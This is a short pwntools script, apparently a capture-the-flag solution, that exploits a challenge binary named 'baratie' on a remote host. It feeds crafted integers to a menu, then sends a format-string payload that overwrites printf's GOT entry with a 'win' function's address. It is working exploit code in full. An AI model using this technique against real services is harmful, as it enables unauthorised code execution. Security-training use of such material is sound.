from pwn import *

context.binary = elf = ELF("./baratie", checksec=False)

if args.LOCAL:
    io = process(elf.path)
else:
    io = remote('31.97.187.222', 13375)


sla = io.sendlineafter
sa = io.sendafter

def goes_celebrate(num):
    sla(b": ", b"1")
    sla(b": ", b"2")
    sla(b": ", str(num).encode())
    sla(b": ", b"2")

# cukup panggil dengan int
goes_celebrate(53504447)
goes_celebrate(4294967296)

#open celebrate()
sla(b": ", b"3")

#format strings
offset = 6
printf_got = elf.got['printf']  # pastikan ada
win_addr = elf.symbols['win']

payload = fmtstr_payload(offset, {printf_got: win_addr}, write_size='short')
payload = payload.replace(b' ', b'')

sla(b": ", payload)

io.interactive()